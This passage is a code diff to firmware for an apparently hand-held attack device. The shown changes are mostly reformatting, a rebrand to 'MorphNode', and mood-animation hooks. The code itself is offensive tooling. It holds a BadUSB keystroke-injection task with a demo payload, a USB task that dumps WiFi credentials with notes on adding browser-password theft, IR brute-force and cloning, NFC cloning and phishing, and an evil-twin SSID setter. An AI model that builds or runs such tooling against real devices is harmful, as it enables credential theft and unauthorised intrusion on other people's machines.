     vTaskDelete(NULL);
 }
@@ -1032,17 +1163,17 @@ static void task_nfc_phishing(void *pvParameters) {
 // --- USB BADUSB TASK ---
 static void task_usb_badusb(void *pvParameters) {
     Serial.println("[ATTACK] Starting BadUSB...");
-    
+
     if (!USBDriver::init()) {
         Serial.println("[USB] Failed to initialize USB HID");
         vTaskDelete(NULL);
         return;
     }
-    
+
     Serial.println("[USB] USB HID Keyboard mode starting...");
     USBDriver::startKeyboard();
     delay(2000); // Wait for host to recognize
-    
+
     // Execute default payload from SD if exists
     if (AggressiveSD::fileExists("/payloads/badusb_default.txt")) {
         Serial.println("[USB] Executing payload from SD card...");
@@ -1050,14 +1181,14 @@ static void task_usb_badusb(void *pvParameters) {
     } else {
         // Demo payload - opens notepad and types message
         Serial.println("[USB] Executing demo payload...");
-        const char* demoPayload = R"(
+        const char *demoPayload = R"(
 DELAY 2000
 GUI r
 DELAY 500
 STRING notepad
 ENTER
 DELAY 1000
-STRING === MONSTER S3 BADUSB ===
+STRING === MORPHNODE BADUSB ===
 ENTER
 STRING This device is compromised!
 ENTER
@@ -1067,15 +1198,15 @@ DELAY 500
 )";
         USBDriver::executePayload(demoPayload);
     }
-    
+
     // Keep running for continuous payloads
     while (!stop_requested) {
         delay(1000);
-        
+
         // Check for new payload files
         // Could implement command queue here
     }
-    
+
     USBDriver::stopKeyboard();
     vTaskDelete(NULL);
 }
@@ -1083,30 +1214,30 @@ DELAY 500
 // --- USB EXFIL TASK ---
 static void task_usb_exfil(void *pvParameters) {
     Serial.println("[ATTACK] Starting USB Exfiltration...");
-    
+
     if (!USBDriver::init()) {
         Serial.println("[USB] Failed to initialize USB HID");
         vTaskDelete(NULL);
         return;
     }
-    
+
     Serial.println("[USB] USB WiFi Credential Exfiltration...");
     USBDriver::startKeyboard();
     delay(2000);
-    
+
     // Execute WiFi credential dump
     Serial.println("[USB] Dumping WiFi credentials...");
     USBDriver::exfilWiFiCredentials();
-    
+
     // Wait for completion
     delay(5000);
-    
+
     // Optional: Also dump browser passwords, etc.
     while (!stop_requested) {
         // Could add more exfil payloads here
         delay(1000);
     }
-    
+
     USBDriver::stopKeyboard();
     vTaskDelete(NULL);
 }
@@ -1131,7 +1262,7 @@ void attacks_init() {
 void attacks_stop() {
     if (current_attack == ATTACK_NONE) return;
 
-    const char* name = attacks_get_name(current_attack);
+    const char *name = attacks_get_name(current_attack);
     stop_requested = true;
     delay(200);
 
@@ -1150,8 +1281,9 @@ void attacks_stop() {
     current_attack = ATTACK_NONE;
 
     // Log and notify
-    log_attack(name, true);  // Assume success if stopped manually
+    log_attack(name, true); // Assume success if stopped manually
     tts_speak("ataque_parado");
+    ChameleonAnim::setMood(MOOD_IDLE);
     Serial.println("[ATTACKS] Stopped");
 }
 
@@ -1162,6 +1294,7 @@ void attacks_start(AttackType type) {
     current_attack = type;
 
     Serial.printf("[ATTACKS] Starting: %s\n", attacks_get_name(type));
+    ChameleonAnim::setMood(MOOD_ATTACK);
 
     switch (type) {
         // BLE - each has specific task
@@ -1239,12 +1372,8 @@ void attacks_start(AttackType type) {
         case ATTACK_IR_TV_OFF:
             xTaskCreate(task_ir_tv_off, "Att_IR", 4096, NULL, 2, &attack_task_handle);
             break;
-        case ATTACK_IR_BRUTE:
-            xTaskCreate(task_ir_brute, "Att_IR", 4096, NULL, 2, &attack_task_handle);
-            break;
-        case ATTACK_IR_CLONE:
-            xTaskCreate(task_ir_clone, "Att_IR", 4096, NULL, 2, &attack_task_handle);
-            break;
+        case ATTACK_IR_BRUTE: xTaskCreate(task_ir_brute, "Att_IR", 4096, NULL, 2, &attack_task_handle); break;
+        case ATTACK_IR_CLONE: xTaskCreate(task_ir_clone, "Att_IR", 4096, NULL, 2, &attack_task_handle); break;
 
         // NFC
         case ATTACK_NFC_CLONE:
@@ -1281,13 +1410,15 @@ void attacks_update() {
 void attacks_report_success() {
     Serial.println("[ATTACKS] Success reported");
     log_attack(attacks_get_name(current_attack), true);
-    ai_report_success();  // +1 reward to AI
+    ai_report_success(); // +1 reward to AI
+    ChameleonAnim::setMood(MOOD_SUCCESS);
 }
 
 void attacks_report_fail() {
     Serial.println("[ATTACKS] Fail reported");
     log_attack(attacks_get_name(current_attack), false);
-    ai_report_failure();  // -1 reward to AI
+    ai_report_failure(); // -1 reward to AI
+    ChameleonAnim::setMood(MOOD_ERROR);
 }
 
 const char *attacks_get_name(AttackType type) {
@@ -1339,7 +1470,7 @@ const char *attacks_get_name(AttackType type) {
     }
 }
 
-void attacks_set_evil_twin_ssid(const char* ssid) {
+void attacks_set_evil_twin_ssid(const char *ssid) {
     if (ssid) {
         strncpy(evil_twin_ssid, ssid, 32);
         evil_twin_ssid[32] = 0;
